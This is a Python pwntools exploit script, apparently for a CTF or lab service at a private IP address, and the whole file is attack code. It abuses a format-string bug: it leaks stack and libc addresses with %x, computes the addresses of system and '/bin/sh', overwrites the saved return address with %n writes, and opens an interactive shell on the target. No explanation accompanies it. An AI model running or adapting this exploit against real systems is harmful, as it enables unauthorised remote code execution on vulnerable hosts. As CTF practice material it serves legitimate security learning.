from pwn import *

p=remote("192.168.125.15", 7777)
#p=process("./service")
p.recvuntil(">")

#leak libc and eip 
payload="%x"
payload+="-%75$x"
p.sendline(payload)

res=int(p.recvuntil("-")[:-1],16)
libc_start_main=int(p.recvuntil(">>")[:-3],16)
libc_base=libc_start_main-0x018e81
system=libc_base+0x03cd10
binsh=libc_base+0x17b8cf

print "res :",hex(res)
print "start_main_libc :",hex(libc_start_main)
print "libc_base ",hex(libc_base)
print "system ",hex(system)
print "binsh ",hex(binsh)
p.recv()
eip_addr=res+0x100
print "eip addr :",hex(eip_addr)
"""
payload=""
payload+="%47$x"
p.sendline(payload)

length_addr=res+0xdb

rerun=int(p.recvuntil(">>")[:-3],16)
rerun-=0x52f77
print "re run program :",hex(rerun)

first_int_1=int(str(hex(rerun))[6:],16)
second_int_1=int(str(hex(rerun))[2:6],16)-first_int_1
if second_int_1 < 0:
	second_int_1+=0x10000
print "first int :",first_int_1
print "second int :",second_int_1
"""
#print "length addr :",hex(length_addr)

# overwrite eip part1

payload="%29477x"
payload+="%7$n"
p.sendline(payload)
p.recvuntil("you ?")


first_int_1=int(str(hex(system))[6:],16)
second_int_1=int(str(hex(system))[2:6],16)-first_int_1
if second_int_1 < 0:
	second_int_1+=0x10000
"""
print "first system int :",first_int_1
print "second system int :",second_int_1
"""


payload=""
payload+=p32(eip_addr)
payload+=p32(eip_addr+2)
payload+="%"+str(first_int_1-8)+"x"
payload+="%11$n"
payload+="%"+str(second_int_1)+"x"
payload+="%12$n"
p.sendline(payload)
p.recv()


first_int_1=int(str(hex(binsh))[6:],16)
second_int_1=int(str(hex(binsh))[2:6],16)-first_int_1
if second_int_1 < 0:
	second_int_1+=0x10000
payload=""
payload+=p32(eip_addr+8)
payload+=p32(eip_addr+10)
payload+="%"+str(first_int_1-8)+"x"
payload+="%11$n"
payload+="%"+str(second_int_1)+"x"
payload+="%12$n"
p.sendline(payload)
p.interactive()
